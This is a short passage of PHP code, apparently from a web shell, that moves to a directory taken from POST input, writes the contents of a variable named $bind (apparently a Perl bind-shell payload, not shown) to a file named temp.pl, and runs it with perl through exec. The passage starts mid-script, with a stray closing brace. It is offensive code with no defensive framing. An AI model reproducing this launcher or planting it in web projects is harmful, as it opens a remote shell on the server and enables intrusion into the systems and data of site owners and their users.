<?php
chdir($_POST['installpath']);
$_POST['installpath'] = "temp.pl";}


$fp = fopen($_POST['installpath'], "w");
fwrite($fp, $bind);
fclose($fp);

exec("perl " . $_POST['installpath']);
die("");
?>